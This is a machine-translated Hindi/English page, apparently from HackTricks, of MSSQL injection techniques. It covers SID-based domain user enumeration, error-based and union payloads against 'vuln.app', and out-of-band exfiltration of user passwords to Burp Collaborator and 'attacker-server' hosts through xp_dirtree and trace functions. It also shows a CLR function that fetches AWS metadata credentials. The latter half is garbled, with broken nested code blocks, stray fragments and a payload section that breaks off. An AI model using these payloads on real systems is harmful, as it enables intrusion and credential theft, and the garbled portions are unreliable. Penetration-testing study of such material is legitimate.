# MSSQL рдЗрдиреНрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** рдЯреНрд╡рд┐рдЯрд░ рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЬрд╛рдБрдЪ

рдПрдХ MSSQL рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдБрдЪ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддреА рд╣реИ** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд MSSQL рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:

* **`SELECT DEFAULT_DOMAIN()`**: рд╡рд░реНрддрдорд╛рди рдбреЛрдореЗрди рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: рдпрджрд┐ рдЖрдк рдбреЛрдореЗрди рдХрд╛ рдирд╛рдо рдЬрд╛рдирддреЗ рд╣реИрдВ (_рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ DOMAIN_) рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ SID** рд╣реЗрдХреНрд╕ рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рд▓реМрдЯрд╛рдПрдЧрд╛ред рдпрд╣ `0x01050000000[...]0000f401` рдЬреИрд╕рд╛ рджрд┐рдЦреЗрдЧрд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рдХрд╛ **рд╕рд╛рдорд╛рдиреНрдп ID 500** рд╣реИ рдЬреЛ **рдмрдбрд╝реЗ рдЗрдВрдбрд┐рдпрди** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╣реИред\
рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЖрдкрдХреЛ **рдбреЛрдореЗрди рдХрд╛ ID рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ (рдЕрдВрддрд┐рдо 4 рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд╕рднреА рдмрд╛рдЗрдЯреНрд╕)ред
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрджрд┐рд╖реНрдЯ ID рдХрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд▓реМрдЯрд╛рдПрдЧрд╛** (рдпрджрд┐ рдХреЛрдИ рд╣реЛ), рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **0000e803** рдмрдбрд╝реЗ рдЗрдВрдбрд┐рдпрди рдореЗрдВ == **1000** (рдЖрдорддреМрд░ рдкрд░ рдпрд╣ рдкрд╣рд▓реЗ рдирд┐рдпрдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ ID рдХрд╛ ID рд╣реЛрддрд╛ рд╣реИ)ред рдлрд┐рд░ рдЖрдк рд╕реЛрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк 1000 рд╕реЗ 2000 рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдбреЛрдореЗрди рдХреЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **рд╡реИрдХрд▓реНрдкрд┐рдХ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдХреНрдЯрд░реНрд╕**

рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдЖрдо рддреМрд░ рдкрд░ `+AND+1=@@version--` рдЬреИрд╕реЗ рдирд┐рд░реНрдорд╛рдгреЛрдВ рдХреА рддрд░рд╣ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрд░рд┐рдПрдВрдЯреНрд╕ рдЬреЛ "OR" рдСрдкрд░реЗрдЯрд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдХреЗ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреНрд╡реЗрд░реА рдЖрдо рддреМрд░ рдкрд░ WAFs рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реЛрдзрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд░реВрдк рдореЗрдВ, рдЦреЛрдЬреА рдЧрдИ рдбреЗрдЯрд╛ рдкрд░ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рд╡рд░реНрддрди рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде %2b рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдЗрди рддрд░рд╣ рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

рдлрд╝рдВрдХреНрд╢рди `USER_NAME()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

рдпреЗ SSRF рдЯреНрд░рд┐рдХреНрд╕ [рдпрд╣рд╛рдБ рд╕реЗ рд▓реА рдЧрдИ рдереАрдВ](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

рдЗрд╕реЗ рд╕рд░реНрд╡рд░ рдкрд░ **`VIEW SERVER STATE`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

рдЗрд╕реЗ **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

рдЗрд╕реЗ **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

рдЬреИрд╕реЗ рдХрд┐ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рд░реВрдк рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рдирд╣реАрдВ рдХрд┐рдП рдЧрдП `xp_dirtree` рдЬреИрд╕реЗ рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡реНрдпрдХреНрддрд┐ рджреНрд╡рд╛рд░рд╛ рдСрдирд▓рд╛рдЗрди рд╡рд░реНрдгрд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЗрдирдХрд╛ рдЙрдкрдпреЛрдЧ MSSQL рдХреЗ рднреАрддрд░ рдиреЗрдЯрд╡рд░реНрдХ рдСрдкрд░реЗрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИред рдЗрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рдбреЗрдЯрд╛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди рдореЗрдВ рдЕрдХреНрд╕рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди [рдЙрджрд╛рд╣рд░рдгреЛрдВ](https://www.notsosecure.com/oob-exploitation-cheatsheet/) рдФрд░ [рдкреЛрд╕реНрдЯреЛрдВ](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `xp_dirtree` рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЗрд╡рд▓ TCP рдкреЛрд░реНрдЯ 445 рдкрд░ рд╕реАрдорд┐рдд рд╣реИред рдкреЛрд░реНрдЯ рдирдВрдмрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд SQL рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
рдпрд╣ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИ рдХрд┐ рдпрд╣ рд╡рд┐рдзрд┐ рд╕рднреА рд╕рд┐рд╕реНрдЯрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА, рдЬреИрд╕реЗ рдХрд┐ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдЬреЛ `Windows Server 2016 Datacenter` рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, `master..xp_fileexist` рдФрд░ `xp_subdirs` рдЬреИрд╕реЗ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░ рд╣реИрдВ рдЬреЛ рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `xp_fileexist` рдкрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдЗрд╕ [TechNet рд▓реЗрдЦ](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк **`xp_cmdshell`** рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдХреБрдЫ рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЬреЛ **SSRF** рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкреГрд╖реНрда рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рдЦрдВрдб** рдкрдврд╝реЗрдВ:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд╛рд░реНрдп - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

CLR UDF (Common Language Runtime User Defined Function) рдмрдирд╛рдирд╛, рдЬреЛ рдХрд┐рд╕реА рднреА .NET рднрд╛рд╖рд╛ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдХреЛрдб рд╣реИ рдФрд░ рдПрдХ DLL рдореЗрдВ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддрд╛рдХрд┐ рдЗрд╕реЗ MSSQL рдореЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдХрд╕реНрдЯрдо рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП `dbo` рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ рдЬрдм рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди `sa` рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛рддреА рд╣реИред

рдПрдХ Visual Studio рдкрд░рд┐рдпреЛрдЬрдирд╛ рдФрд░ рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢ рдЗрд╕ [рдЗрд╕ Github рднрдВрдбрд╛рд░](https://github.com/infiniteloopltd/SQLHttp) рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реИрдВ рддрд╛рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЛ MSSQL рдореЗрдВ CLR рдПрд╕реЗрдореНрдмрд▓реА рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдорд┐рд▓ рд╕рдХреЗ, рдЬрд┐рд╕рд╕реЗ MSSQL рдХреЗ рдЕрдВрджрд░ рд╕реЗ HTTP GET рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛред

рдЗрд╕ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдореВрд▓ рднрд╛рдЧ `http.cs` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ, рдЬреЛ `WebClient` рд╡рд░реНрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕рд╛ рдирд┐рд░реВрдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
рдкрд╣рд▓реЗ `CREATE ASSEMBLY` SQL рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд SQL рд╕реНрдирд┐рдкреЗрдЯ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИ рддрд╛рдХрд┐ рдЕрд╕реЗрдореНрдмрд▓реА рдХреЗ SHA512 рд╣реИрд╢ рдХреЛ рд╕рд░реНрд╡рд░ рдХреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрд╕реЗрдореНрдмрд▓рд┐рдпреЛрдВ рдХреА рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗ (рдЬрд┐рд╕реЗ `select * from sys.trusted_assemblies;` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
рдЬрдм рдПрд╕реЗрдореНрдмрд▓реА рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд SQL рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ HTTP рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **рддреНрд╡рд░рд┐рдд рд╢реЛрдз: рдПрдХ рд╣реА рдХреНрд╡реЗрд░реА рдореЗрдВ рдкреВрд░реА рддрд╛рд▓рд┐рдХрд╛ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛**

[рдпрд╣рд╛рдБ рд╕реЗ рдЯреНрд░рд┐рдХ](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

рдПрдХ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рд╡рд┐рдзрд┐ рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣реА рдХреНрд╡реЗрд░реА рдореЗрдВ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдХреА рдкреВрд░реА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЙрд╕рдореЗрдВ `FOR JSON` рд╢рд░реНрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг `FOR XML` рд╢рд░реНрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рд╣реИ, рдЬрд┐рд╕рдореЗрдВ "raw" рдЬреИрд╕рд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдореЛрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред `FOR JSON` рд╢рд░реНрдд рдХреЛ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдкрд╕рдВрдж рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рд╡рд░реНрддрдорд╛рди рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рд╕реНрдХреАрдорд╛, рддрд╛рд▓рд┐рдХрд╛рдПрдБ, рдФрд░ рд╕реНрддрдВрдн рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
### MSSQL Injection

#### SQL Injection in MSSQL

рдпрд╣рд╛рдБ рд╣рдо рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦ рд░рд╣реЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рд╣рдордиреЗ MSSQL рдореЗрдВ SQL Injection рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИред

URL: `https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--`
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```html
<p>рдпрд╣рд╛рдБ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХреИрд╕реЗ MSSQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:</p>
<p>https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null</p>
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 ╨╕╨╗╨╕ %C2%A0:

```
### MSSQL Injection

#### Union-Based SQL Injection

To exploit an MSSQL database using union-based SQL injection, you can use the following payload in the URL parameter:

```
